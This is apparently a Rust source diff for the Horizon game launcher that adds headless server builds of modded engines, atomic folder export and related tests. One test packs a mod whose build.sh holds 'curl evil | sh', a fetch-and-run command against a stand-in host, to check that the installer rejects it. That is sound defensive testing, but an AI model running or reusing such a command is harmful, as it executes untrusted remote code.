+                plan: built.plan,
+            });
+        }
+        Ok(built.version)
+    })
+}
+
+/// Builds `folder`'s mods as the headless engine a dedicated server runs (`horizon-engine`,
+/// docs/server.md): the same pipeline as [`build`] on the same revision, compiled with
+/// `--no-default-features`, installed as its own version (its key distinct from the game's, so
+/// the two never stand in for each other) and exported into `output` as a standalone runtime
+/// folder: the built engine, the base version's resources, the mods' post-build data and the
+/// build's record. The folder lives outside the launcher's managed versions, where nothing of
+/// the launcher's can remove it; nothing of it is overwritten, and a folder already at `output`
+/// is refused before anything is downloaded or compiled. No instance is edited and no version
+/// selected: a server build changes nothing the launcher's window plays. Returns the absolute
+/// path of the exported engine binary.
+pub fn build_server(
+    base: &str,
+    folder: &Path,
+    output: &Path,
+    anyway: bool,
+    profile: Profile,
+    progress: impl Fn(Step),
+) -> Result<PathBuf, String> {
+    logged(|| {
+        if output.symlink_metadata().is_ok() {
+            return Err(trf(
+                "{path} already exists. Move it away, or build into another folder.",
+                &[("path", &output.display().to_string())],
+            ));
+        }
+        let parent = output
+            .parent()
+            .filter(|p| !p.as_os_str().is_empty())
+            .unwrap_or(Path::new("."));
+        fs::create_dir_all(parent).map_err(|e| e.to_string())?;
+        let output = parent.canonicalize().map_err(|e| e.to_string())?.join(
+            output
+                .file_name()
+                .ok_or_else(|| tr("Choose a new folder for the server export."))?,
+        );
+        for managed in [backend::version_dir(""), root()] {
+            if managed
+                .canonicalize()
+                .is_ok_and(|dir| output.starts_with(dir))
+            {
+                return Err(tr("Export the server outside the launcher's managed folders.").into());
+            }
+        }
+        let built = pipeline(base, folder, anyway, profile, Target::Server, &progress)?;
+        export(&Target::Server.directory(&built.version), &output)?;
+        // Exports are independent; keep only the newest cached server builds.
+        let cached = root().join("server-builds");
+        let builds = fs::read_dir(&cached)
+            .into_iter()
+            .flatten()
+            .flatten()
+            .filter(|e| e.path().join(".installed").is_file())
+            .map(|e| {
+                let at = fs::metadata(e.path().join(".installed"))
+                    .and_then(|m| m.modified())
+                    .unwrap_or(std::time::UNIX_EPOCH);
+                (e.file_name().to_string_lossy().into_owned(), at)
+            })
+            .collect();
+        for old in stale(builds, &built.version, &[]) {
+            let _ = fs::remove_dir_all(cached.join(old));
+        }
+        if built.plan != Plan::UpToDate {
+            progress(Step::Done {
+                secs: built.secs,
+                profile: built.profile,
+                plan: built.plan,
+            });
+        }
+        let engine = output.join(Target::Server.binary());
+        Ok(std::path::absolute(&engine).unwrap_or(engine))
+    })
+}
+
+/// Copies the built version folder `from` into `output` (outside the managed versions) as one
+/// piece: staged in a hidden folder beside `output`, then renamed into place, so an interrupted
+/// export leaves nothing half-written at `output` and overwrites nothing already there.
+/// Executable files keep their permissions ([`backend::copy_dir`], a clone where the disk can).
+fn export(from: &Path, output: &Path) -> Result<(), String> {
+    let name = output.file_name().ok_or_else(|| {
+        trf(
+            "{path} is not a folder to build into.",
+            &[("path", &output.display().to_string())],
+        )
+    })?;
+    let parent = output.parent().unwrap_or(output);
+    fs::create_dir_all(parent).map_err(|e| format!("{}: {e}", parent.display()))?;
+    let staging = parent.join(format!(
+        ".{}.{}.exporting",
+        name.to_string_lossy(),
+        std::process::id()
+    ));
+    fs::create_dir(&staging).map_err(|e| format!("{}: {e}", staging.display()))?;
+    if let Err(e) = copy_runtime(from, &staging) {
+        let _ = fs::remove_dir_all(&staging);
+        return Err(trf(
+            "Could not copy the build: {error}",
+            &[("error", &e.to_string())],
+        ));
     }
-    Ok(version)
+    if output.symlink_metadata().is_ok() {
+        let _ = fs::remove_dir_all(&staging);
+        return Err(trf(
+            "{path} already exists. Move it away, or build into another folder.",
+            &[("path", &output.display().to_string())],
+        ));
+    }
+    fs::rename(&staging, output).map_err(|e| {
+        let _ = fs::remove_dir_all(&staging);
+        trf(
+            "Could not move the build to {path}: {error}",
+            &[
+                ("path", &output.display().to_string()),
+                ("error", &e.to_string()),
+            ],
+        )
+    })
+}
+
+/// Reflinks are independent files but may not preserve executable permissions.
+fn copy_runtime(from: &Path, to: &Path) -> std::io::Result<()> {
+    fs::create_dir_all(to)?;
+    for entry in fs::read_dir(from)? {
+        let entry = entry?;
+        let destination = to.join(entry.file_name());
+        if entry.file_type()?.is_dir() {
+            copy_runtime(&entry.path(), &destination)?;
+        } else {
+            horizon_prepare::clone_or_copy(&entry.path(), &destination)?;
+            fs::set_permissions(&destination, entry.metadata()?.permissions())?;
+        }
+    }
+    Ok(())
 }
 
 /// Copies the program `from` (in the shared target folder) to `to`, keeping it executable.
@@ -1422,23 +1937,24 @@ fn copy_out(from: &Path, to: &Path) -> Result<(), String> {
 }
 
 /// Installs `binary` as version `version`: a copy of installed version `base`'s folder (its
-/// resources included; cloned where the disk can) with the built game in place of `base`'s.
-/// `finish` (the mods' post-build steps) runs in its folder before it counts as installed; when
-/// it fails, the folder is removed.
+/// resources included; cloned where the disk can) with the built binary, as `target` names it,
+/// in place of `base`'s. `finish` (the mods' post-build steps) runs in its folder before it
+/// counts as installed; when it fails, the folder is removed.
 fn install(
     base: &str,
     version: &str,
+    target: Target,
     binary: &Path,
     about: &serde_json::Value,
     finish: impl FnOnce(&Path) -> Result<(), String>,
 ) -> Result<(), String> {
     let from = backend::version_dir(base);
-    let partial = backend::version_dir(&format!(".{version}.partial"));
+    let partial = target.directory(&format!(".{version}.partial"));
     let _ = fs::remove_dir_all(&partial);
     fs::create_dir_all(&partial).map_err(|e| e.to_string())?;
     for entry in fs::read_dir(&from).map_err(|e| e.to_string())?.flatten() {
         let name = entry.file_name();
-        if !carried_over(&name) {
+        if !carried_over(&name, target) {
             continue;
         }
         let to = partial.join(&name);
@@ -1451,10 +1967,10 @@ fn install(
         };
         copied.map_err(|e| format!("Could not copy {}: {e}", entry.path().display()))?;
     }
-    let client = partial.join(backend::CLIENT);
-    fs::copy(binary, &client).map_err(|e| format!("The built game: {e}"))?;
+    let installed = partial.join(target.binary());
+    fs::copy(binary, &installed).map_err(|e| format!("The built game: {e}"))?;
     fs::write(partial.join("native-mods.json"), about.to_string()).map_err(|e| e.to_string())?;
-    let dir = backend::version_dir(version);
+    let dir = target.directory(version);
     let _ = fs::remove_dir_all(&dir);
     fs::rename(&partial, &dir).map_err(|e| e.to_string())?;
     if let Err(e) = finish(&dir) {
@@ -1464,19 +1980,24 @@ fn install(
     fs::write(dir.join(".installed"), "").map_err(|e| e.to_string())
 }
 
-/// Whether a file of the version a build starts from goes into the new build. The game, its
-/// record, and the mods' post-build data (`native-data/`, which the new build's steps write
-/// again) are the new build's own: a mod turned off leaves none of its data behind.
-fn carried_over(name: &std::ffi::OsStr) -> bool {
-    ![
-        backend::CLIENT,
-        ".installed",
-        "Horizon.app",
-        "native-mods.json",
-        "native-data",
-    ]
-    .iter()
-    .any(|n| name == *n)
+/// Whether a file of the version a build starts from goes into the new build. The game (the
+/// target's own binary), its record, and the mods' post-build data (`native-data/`, which the
+/// new build's steps write again) are the new build's own: a mod turned off leaves none of its
+/// data behind. A server build is the headless engine: it keeps neither the game's own binary
+/// nor any `horizon-engine` the base shipped, which would run unmodded beside its own.
+fn carried_over(name: &std::ffi::OsStr, target: Target) -> bool {
+    let mut own: Vec<String> = ["Horizon.app", "native-mods.json", "native-data"]
+        .iter()
+        .map(|s| s.to_string())
+        .collect();
+    own.push(backend::CLIENT.to_string());
+    own.push(".installed".to_string());
+    if target == Target::Server {
+        own.push("horizon-engine".to_string());
+    }
+    let named = |n: &str| name == std::ffi::OsStr::new(n);
+    !own.iter()
+        .any(|n| named(n) || named(&format!("{n}{}", std::env::consts::EXE_SUFFIX)))
 }
 
 /// How many native builds no instance plays stay installed, the newest first: switching a mod
@@ -1523,6 +2044,8 @@ fn stale(
 
 #[cfg(test)]
 mod tests {
+    static LOG_TEST: std::sync::Mutex<()> = std::sync::Mutex::new(());
+
     use super::*;
 
     #[test]
@@ -1534,14 +2057,23 @@ mod tests {
             "native-mods.json",
             "native-data",
         ] {
-            assert!(!carried_over(OsStr::new(own)), "{own}");
+            assert!(!carried_over(OsStr::new(own), Target::Client), "{own}");
         }
         for kept in ["horizon-ctl", "resources", "LICENSE"] {
-            assert!(carried_over(OsStr::new(kept)), "{kept}");
+            assert!(carried_over(OsStr::new(kept), Target::Client), "{kept}");
         }
+        // A server build keeps neither the game's own binary nor a stale `horizon-engine` the
+        // base shipped, which would run unmodded beside the built one.
+        let engine = Target::Server.binary();
+        assert!(
+            !carried_over(OsStr::new(&engine), Target::Server),
+            "{engine}"
+        );
+        assert!(!carried_over(OsStr::new(backend::CLIENT), Target::Server));
+        assert!(carried_over(OsStr::new("resources"), Target::Server));
     }
 
-    fn dir(name: &str) -> PathBuf {
+    pub(super) fn dir(name: &str) -> PathBuf {
         let d = std::env::temp_dir().join(format!("horizon-native-{name}-{}", std::process::id()));
         let _ = fs::remove_dir_all(&d);
         fs::create_dir_all(&d).unwrap();
@@ -1608,6 +2140,57 @@ mod tests {
         assert!(bundles(&many.join("notes")).is_err());
     }
 
+    #[test]
+    fn mixin_input_excludes_trait_only_bundles_but_keeps_trait_injections() {
+        let root = dir("mixed-mixin-input");
+        let incoming = root.join("incoming");
+        for (id, injection) in [
+            ("plain", ""),
+            ("ordinary", "[[injection]]\nid = 'ordinary'\n"),
+            ("trait_injection", "[[injection]]\nid = 'hook'\ntarget = 'horizon_client::game::tick'\nkind = 'HEAD'\ntrait_method = 'tick'\n"),
+        ] {
+            let bundle = incoming.join(id);
+            fs::create_dir_all(bundle.join("engine")).unwrap();
+            fs::write(bundle.join("engine/Cargo.toml"), "[package]\nname = 'example'\nversion = '1.0.0'\n").unwrap();
+            fs::write(bundle.join(MANIFEST), format!("[mod]\nid = '{id}'\nversion = '1'\n[api]\npath = 'engine'\n{injection}")).unwrap();
+        }
+        let mods = bundles(&incoming).unwrap();
+        assert!(!mods[1].mixins_content);
+        assert!(mods[0].mixins_content && mods[2].mixins_content);
+        let key = inject_cache::key("rev", "mixins", Profile::Fast, &mods).unwrap();
+        let without_plain: Vec<_> = mods.iter().filter(|b| b.id != "plain").cloned().collect();
+        assert_ne!(
+            key,
+            inject_cache::key("rev", "mixins", Profile::Fast, &without_plain).unwrap()
+        );
+
+        let injections = inject::prepare(&mods, &root).unwrap();
+        assert_eq!(injections.len(), 1);
+        let input = root.join("mixins");
+        stage_mixins(&mods, &input).unwrap();
+        assert!(!input.join("plain").exists());
+        assert!(input.join("ordinary").join(MANIFEST).is_file());
+        assert!(input
+            .join("trait_injection")
+            .join("horizon-trait-injection-0.rs")
+            .is_file());
+        let manifest = fs::read_to_string(input.join("trait_injection").join(MANIFEST)).unwrap();
+        assert!(manifest.contains("horizon-trait-injection-0.rs"));
+        assert!(!manifest.contains("trait_method"));
+
+        for id in ["plain", "ordinary"] {
+            fs::create_dir_all(incoming.join(id).join("data")).unwrap();
+            fs::write(incoming.join(id).join("data/table.txt"), id).unwrap();
+        }
+        let stage = root.join("stage");
+        stage_trait_data(&mods, &stage).unwrap();
+        let read =
+            |id: &str| fs::read_to_string(stage.join("native-data").join(id).join("table.txt"));
+        assert_eq!(read("plain").unwrap(), "plain");
+        assert!(read("ordinary").is_err(), "horizon-mixins stages it");
+        fs::remove_dir_all(root).unwrap();
+    }
+
     const A: &str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
     const B: &str = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
 
@@ -1617,7 +2200,9 @@ mod tests {
             "horizon": horizon, "mixins": mixins});
         fs::create_dir_all(at.join("mixins").join(id)).unwrap();
         fs::write(at.join(NATIVE_MANIFEST), manifest.to_string()).unwrap();
-        let toml = format!("[mod]\nid = \"{id}\"\nversion = \"0.3.0\"\n[compatibility]\nhorizon_revision = \"{horizon}\"\n");
+        let toml = format!(
+            "[mod]\nid = \"{id}\"\nversion = \"0.3.0\"\n[compatibility]\nhorizon_revision = \"{horizon}\"\n"
+        );
         fs::write(at.join("mixins").join(id).join(MANIFEST), toml).unwrap();
     }
 
@@ -1689,11 +2274,12 @@ mod tests {
         let out = installed_mods(&home).unwrap();
         let path = out.join("veinminer/mixins/veinminer/data/table.bin");
         assert_eq!(fs::read(&path).unwrap(), b"data");
-        let first = version_for(A, B, Profile::Fast, &bundles(&out).unwrap()).unwrap();
+        let first =
+            version_for(A, B, Profile::Fast, Target::Client, &bundles(&out).unwrap()).unwrap();
         fs::write(path, b"changed").unwrap();
         assert_ne!(
             first,
-            version_for(A, B, Profile::Fast, &bundles(&out).unwrap()).unwrap()
+            version_for(A, B, Profile::Fast, Target::Client, &bundles(&out).unwrap()).unwrap()
         );
         pack("veinminer.hnmod", Some(("build.sh", "curl evil | sh")));
         assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
@@ -1708,6 +2294,8 @@ mod tests {
             horizon: horizon.map(str::to_owned),
             mixins: None,
             hooks: None,
+            api: None,
+            mixins_content: false,
         };
         let never = || -> Result<String, String> { panic!("a pin wins") };
         fn get(b: &Bundle) -> Option<&String> {
@@ -1740,6 +2328,8 @@ mod tests {
             horizon: horizon.map(str::to_owned),
             mixins: mixins.map(str::to_owned),
             hooks: None,
+            api: None,
+            mixins_content: false,
         };
         let c = "c".repeat(40);
         // a is the oldest commit, then b, then c.
@@ -1843,6 +2433,8 @@ mod tests {
             horizon: Some(horizon.into()),
             mixins: None,
             hooks,
+            api: None,
+            mixins_content: false,
         };
         let c = "c".repeat(40);
         // A (the game) has hook points v1, B v2, C none.
@@ -1899,6 +2491,8 @@ mod tests {
             horizon: Some(horizon.into()),
             mixins: None,
             hooks,
+            api: None,
+            mixins_content: false,
         };
         let (c, d) = ("c".repeat(40), "d".repeat(40));
         // A (the old build's revision) has hook points v1, B (the installed game) v7.
@@ -1958,7 +2552,14 @@ mod tests {
         let d = dir("key");
         write_bundle(&d, "hello", "fn hook() {}");
         let key = |revision: &str| {
-            version_for(revision, MIXINS_REV, Profile::Fast, &bundles(&d).unwrap()).unwrap()
+            version_for(
+                revision,
+                MIXINS_REV,
+                Profile::Fast,
+                Target::Client,
+                &bundles(&d).unwrap(),
+            )
+            .unwrap()
         };
         let first = key(A);
         assert!(
@@ -1969,10 +2570,55 @@ mod tests {
         assert_ne!(first, key(B));
         assert_ne!(
             first,
-            version_for(A, B, Profile::Fast, &bundles(&d).unwrap()).unwrap()
+            version_for(A, B, Profile::Fast, Target::Client, &bundles(&d).unwrap()).unwrap()
         );
         fs::write(d.join("hook.rs"), "fn hook() { let _ = 1; }").unwrap();
         assert_ne!(first, key(A));
+    }
+
+    #[test]
+    fn api_target_is_neither_copied_nor_hashed() {
+        let d = dir("api-target");
+        fs::create_dir_all(d.join("engine/target/debug")).unwrap();
+        fs::create_dir_all(d.join("other/target")).unwrap();
+        fs::create_dir_all(d.join("engine/empty")).unwrap();
+        fs::write(
+            d.join(MANIFEST),
+            "[mod]\nid = 'example'\nversion = '1'\n[api]\npath = 'engine'\n",
+        )
+        .unwrap();
+        fs::write(
+            d.join("engine/Cargo.toml"),
+            "[package]\nname = 'example'\nversion = '0.1.0'\n",
+        )
+        .unwrap();
+        fs::write(d.join("engine/target/debug/output"), "one").unwrap();
+        fs::write(d.join("other/target/keep"), "keep").unwrap();
+        let bundle = bundle(&d, None).unwrap();
+        let key = || {
+            version_for(
+                A,
+                B,
+                Profile::Fast,
+                Target::Client,
+                std::slice::from_ref(&bundle),
+            )
+            .unwrap()
+        };
+        let first = key();
+        let hash = mod_hash(&bundle).unwrap();
+        let digest = source_digest(&bundle);
+        fs::write(d.join("engine/target/debug/output"), "two").unwrap();
+        assert_eq!(first, key());
+        assert_eq!(hash, mod_hash(&bundle).unwrap());
+        assert_eq!(digest, source_digest(&bundle));
+        let dest = dir("api-target-copy");
+        copy_bundle(&bundle, &dest).unwrap();
+        assert!(!dest.join("engine/target").exists());
+        assert!(dest.join("engine/empty").is_dir());
+        assert!(dest.join("other/target/keep").is_file());
+        fs::write(d.join("engine/Cargo.toml"), "changed").unwrap();
+        assert_ne!(first, key());
     }
 
     /// The test bundle (`tests/fixtures/native-crate-demo`): its crate's sources and data, and its
@@ -1985,7 +2631,8 @@ mod tests {
         backend::copy_dir(&fixture, &d).unwrap();
         let found = bundles(&d).unwrap();
         assert_eq!(found[0].id, "crate_demo");
-        let key = || version_for(A, B, Profile::Fast, &bundles(&d).unwrap()).unwrap();
+        let key =
+            || version_for(A, B, Profile::Fast, Target::Client, &bundles(&d).unwrap()).unwrap();
         let mut seen = vec![key()];
         for file in [
             "engine/src/lib.rs",
@@ -2007,10 +2654,248 @@ mod tests {
         let d = dir("profile-key");
         write_bundle(&d, "hello", "fn hook() {}");
         let found = bundles(&d).unwrap();
-        let fast = version_for(A, B, Profile::Fast, &found).unwrap();
-        let release = version_for(A, B, Profile::Release, &found).unwrap();
+        let fast = version_for(A, B, Profile::Fast, Target::Client, &found).unwrap();
+        let release = version_for(A, B, Profile::Release, Target::Client, &found).unwrap();
         assert_ne!(fast, release);
-        assert_eq!(fast, version_for(A, B, Profile::Fast, &found).unwrap());
+        assert_eq!(
+            fast,
+            version_for(A, B, Profile::Fast, Target::Client, &found).unwrap()
+        );
+    }
+
+    /// The server build (docs/server.md): compiled headless off the same source, with its own
+    /// key, and the game build's flags unchanged.
+    #[test]
+    fn a_server_build_compiles_headless_with_its_own_key() {
+        let d = dir("server-key");
+        write_bundle(&d, "hello", "fn hook() {}");
+        let found = bundles(&d).unwrap();
+        let key = |target: Target| version_for(A, B, Profile::Fast, target, &found).unwrap();
+        assert_ne!(
+            key(Target::Client),
+            key(Target::Server),
+            "the two targets never stand in for each other"
+        );
+        assert_eq!(key(Target::Server), key(Target::Server));
+        assert_ne!(
+            key(Target::Server),
+            version_for(A, B, Profile::Release, Target::Server, &found).unwrap(),
+            "the profile is still in the server key"
+        );
+        let rust = Toolchain {
+            dir: PathBuf::from("/rust/1.99.1-x"),
+        };
+        let flags = |stage: &Path, target: Target| {
+            compile(
+                &rust,
+                stage,
+                target,
+                Path::new("/native/target"),
+                Profile::Fast,
+                "horizon-client",
+            )
+            .get_args()
+            .map(|a| a.to_string_lossy().into_owned())
+            .collect::<Vec<String>>()
+        };
+        let server = flags(&d, Target::Server);
+        assert!(server.contains(&"--no-default-features".into()));
+        assert!(
+            !server.iter().any(|a| a.starts_with("--features")),
+            "no feature the source doesn't have"
+        );
+        let client = flags(&d, Target::Client);
+        assert!(!client.contains(&"--no-default-features".into()));
+        // A source with the `mods` feature keeps it in both builds.
+        fs::create_dir_all(d.join("crates/horizon-client")).unwrap();
+        fs::write(
+            d.join("crates/horizon-client/Cargo.toml"),
+            "[features]\nmods = []\n",
+        )
+        .unwrap();
+        for target in [Target::Client, Target::Server] {
+            let args = flags(&d, target);
+            assert!(
+                args.windows(2)
+                    .any(|w| w == ["--features", FEATURES].map(String::from)),
+                "{:?}: the mods feature stays on",
+                target
+            );
+        }
+    }
+
+    /// A record (`native-mods.json`) says what it compiles; one from before targets were
+    /// recorded is a client build, so it still reads ([`about`]).
+    #[test]
+    fn a_builds_record_names_its_target_and_older_ones_still_read() {
+        let d = dir("about-target");
+        let record = |target: Option<&str>| {
+            let json = match target {
+                Some(target) => {
+                    format!(r#"{{"base":"v2026.10.13","horizon":"{A}","target":"{target}"}}"#)
+                }
+                None => format!(r#"{{"base":"v2026.10.13","horizon":"{A}"}}"#),
+            };
+            fs::write(d.join("native-mods.json"), json).unwrap();
+            about_in(&d).unwrap()
+        };
+        assert_eq!(
+            record(None).target,
+            Target::Client,
+            "a build from before targets"
+        );
+        assert_eq!(record(Some("client")).target, Target::Client);
+        assert_eq!(record(Some("server")).target, Target::Server);
+        assert_eq!(record(Some("anything-else")).target, Target::Client);
+        assert_eq!(record(None).horizon, A);
+    }
+
+    /// The export ([`build_server`]): a standalone runtime folder with the engine, the mods'
+    /// data and the build's record, engine still executable, and nothing of the player's
+    /// overwritten.
+    #[test]
+    fn an_exported_server_folder_keeps_its_files_and_overwrites_nothing() {
+        let built = dir("export-built");
+        fs::write(built.join(Target::Server.binary()), b"engine").unwrap();
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::PermissionsExt;
+            fs::set_permissions(
+                built.join(Target::Server.binary()),
+                std::fs::Permissions::from_mode(0o755),
+            )
+            .unwrap();
+        }
+        fs::create_dir_all(built.join("native-data/bake")).unwrap();
+        fs::write(built.join("native-data/bake/table.bin"), b"data").unwrap();
+        fs::create_dir_all(built.join("resources")).unwrap();
+        fs::write(built.join("resources/lang.json"), b"{}").unwrap();
+        let out = dir("export-out");
+        let output = out.join("server");
+        export(&built, &output).unwrap();
+        assert_eq!(
+            fs::read(output.join(Target::Server.binary())).unwrap(),
+            b"engine"
+        );
+        assert_eq!(
+            fs::read(output.join("native-data/bake/table.bin")).unwrap(),
+            b"data"
+        );
+        assert_eq!(fs::read(output.join("resources/lang.json")).unwrap(), b"{}");
+        assert_eq!(
+            fs::read_dir(&out).unwrap().flatten().count(),
+            1,
+            "no staging folder left beside it"
+        );
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::PermissionsExt;
+            let mode = fs::metadata(output.join(Target::Server.binary()))
+                .unwrap()
+                .permissions()
+                .mode();
+            assert_eq!(mode & 0o111, 0o111, "the engine stays executable");
+        }
+        // A folder already there is refused, and its contents are left alone.
+        let taken = dir("export-taken");
+        fs::write(taken.join("keep.txt"), b"mine").unwrap();
+        let err = export(&built, &taken).unwrap_err();
+        assert!(err.contains("already exists"), "{err}");
+        assert_eq!(fs::read(taken.join("keep.txt")).unwrap(), b"mine");
+        let failed = out.join("failed");
+        assert!(export(&out.join("missing-source"), &failed).is_err());
+        assert!(!failed.exists());
+        assert_eq!(fs::read_dir(&out).unwrap().flatten().count(), 1);
+    }
+
+    #[test]
+    fn server_install_is_not_playable_and_export_survives_cache_removal() {
+        let base = "native-test-server-base";
+        let version = "native-test-server-cache";
+        let source = backend::version_dir(base);
+        fs::create_dir_all(source.join(".local/horizon-client/26.3")).unwrap();
+        fs::write(
+            source.join(".local/horizon-client/26.3/facts.json"),
+            b"facts",
+        )
+        .unwrap();
+        fs::write(source.join(Target::Server.binary()), b"unmodded").unwrap();
+        let binary = dir("server-install").join("built");
+        fs::write(&binary, b"modded").unwrap();
+        install(
+            base,
+            version,
+            Target::Server,
+            &binary,
+            &serde_json::json!({"target":"server"}),
+            |d| {
+                fs::create_dir_all(d.join("native-data")).unwrap();
+                fs::write(d.join("native-data/test"), b"baked").unwrap();
+                Ok(())
+            },
+        )
+        .unwrap();
+        assert!(!backend::installed().contains(&version.to_string()));
+        let cached = Target::Server.directory(version);
+        let output = dir("server-independent").join("export");
+        export(&cached, &output).unwrap();
+        fs::remove_dir_all(cached).unwrap();
+        assert_eq!(
+            fs::read(output.join(Target::Server.binary())).unwrap(),
+            b"modded"
+        );
+        assert_eq!(fs::read(output.join("native-data/test")).unwrap(), b"baked");
+        assert_eq!(
+            fs::read(output.join(".local/horizon-client/26.3/facts.json")).unwrap(),
+            b"facts"
+        );
+        assert!(output.join("native-mods.json").is_file());
+        let _ = fs::remove_dir_all(source);
+    }
+
+    /// The export's own gate: an output that already exists is refused before anything is
+    /// downloaded or compiled (a base that isn't installed would refuse the build otherwise),
+    /// and no instance is edited or version selected.
+    #[test]
+    fn a_server_build_refuses_an_existing_output_before_building() {
+        let _guard = LOG_TEST.lock().unwrap();
+        let output = dir("server-output");
+        let folder = dir("server-mods");
+        write_bundle(&folder, "hello", "fn hook() {}");
+        let instances_before = instances::list();
+        let selected_before = backend::Settings::load().selected;
+        let err = build_server(
+            "v0.0.0-not-installed",
+            &folder,
+            &output,
+            true,
+            Profile::Fast,
+            |_| {},
+        )
+        .unwrap_err();
+        assert!(err.contains("already exists"), "{err}");
+        assert!(fs::read_to_string(log_path()).unwrap().contains(&err));
+        let managed = root().join("forbidden-export");
+        let err = build_server(
+            "v0.0.0-not-installed",
+            &folder,
+            &managed,
+            true,
+            Profile::Fast,
+            |_| {},
+        )
+        .unwrap_err();
+        assert!(
+            err.contains("outside the launcher's managed folders"),
+            "{err}"
+        );
+        assert!(!managed.exists());
+        assert_eq!(instances::list(), instances_before, "no instance is edited");
+        assert_eq!(
+            backend::Settings::load().selected,
+            selected_before,
+            "no version is selected"
+        );
     }
 
     #[test]
@@ -2025,6 +2910,57 @@ mod tests {
         assert_eq!(
             (Profile::Fast.name(), Profile::Release.name()),
             ("fast", "release")
+        );
+    }
+
+    /// The build log ([`clear_log`], [`append_log`]): fresh for every attempt, and an early
+    /// failure (before any command ran) recorded in it, in one test because they share the
+    /// one log file.
+    #[test]
+    fn the_log_is_fresh_per_attempt_and_keeps_early_failures() {
+        let _guard = LOG_TEST.lock().unwrap();
+        clear_log().unwrap();
+        append_log("the last build's output").unwrap();
+        clear_log().unwrap();
+        assert_eq!(fs::read(log_path()).unwrap(), b"");
+        append_log("a line").unwrap();
+        append_log("another").unwrap();
+        assert_eq!(fs::read_to_string(log_path()).unwrap(), "a line\nanother\n");
+        // A build that fails before anything runs empties the old log and says why.
+        let folder = dir("log-early");
+        write_bundle(&folder, "hello", "fn hook() {}");
+        let out = dir("log-early-out");
+        let err = build_server(
+            "v0.0.0-not-installed",
+            &folder,
+            &out.join("server"),
+            true,
+            Profile::Fast,
+            |_| {},
+        )
+        .unwrap_err();
+        assert!(err.contains("is not prepared yet"), "{err}");
+        let log = fs::read_to_string(log_path()).unwrap();
+        assert!(log.contains("is not prepared yet"), "{log}");
+        assert!(!log.contains("the last build's output"), "{log}");
+        // A failure after compiler output keeps those diagnostics and the final reason.
+        let failure: Result<(), String> = logged(|| {
+            append_log("error[E0425]: cannot find value `missing` in this scope")?;
+            Err("Could not export the engine".into())
+        });
+        assert!(failure.is_err());
+        let log = fs::read_to_string(log_path()).unwrap();
+        assert!(log.starts_with("error[E0425]"), "{log}");
+        assert!(
+            log.ends_with("The build failed: Could not export the engine\n"),
+            "{log}"
+        );
+        assert!(!log.contains("Build completed."), "{log}");
+        let success: Result<(), String> = logged(|| Ok(()));
+        success.unwrap();
+        assert_eq!(
+            fs::read_to_string(log_path()).unwrap(),
+            "Build completed.\n"
         );
     }
 
@@ -2235,7 +3171,14 @@ mod tests {
             dir: PathBuf::from("/rust/1.99.1-x"),
         };
         let stage = dir("stage-config");
-        let cmd = compile(&rust, &stage, Path::new("/native/target"), Profile::Fast);
+        let cmd = compile(
+            &rust,
+            &stage,
+            Target::Client,
+            Path::new("/native/target"),
+            Profile::Fast,
+            "horizon-client",
+        );
         let args: Vec<String> = cmd
             .get_args()
             .map(|a| a.to_string_lossy().into_owned())
@@ -2260,7 +3203,14 @@ mod tests {
         // The workspace's own configuration still applies.
         fs::create_dir_all(stage.join(".cargo")).unwrap();
         fs::write(stage.join(".cargo/config.toml"), "").unwrap();
-        let cmd = compile(&rust, &stage, Path::new("/native/target"), Profile::Fast);
+        let cmd = compile(
+            &rust,
+            &stage,
+            Target::Client,
+            Path::new("/native/target"),
+            Profile::Fast,
+            "horizon-client",
+        );
         let args: Vec<_> = cmd.get_args().collect();
         assert_eq!(args[1], "--config");
         assert_eq!(args[2], stage.join(".cargo/config.toml"));
@@ -2286,7 +3236,14 @@ mod tests {
         let rust = Toolchain {
             dir: PathBuf::from("/rust/1.99.1-x"),
         };
-        let cmd = compile(&rust, &d, Path::new("/native/target"), Profile::Fast);
+        let cmd = compile(
+            &rust,
+            &d,
+            Target::Client,
+            Path::new("/native/target"),
+            Profile::Fast,
+            "horizon-client",
+        );
         let args: Vec<_> = cmd.get_args().collect();
         assert!(args.windows(2).any(|w| w == ["--profile", "fast"]));
     }
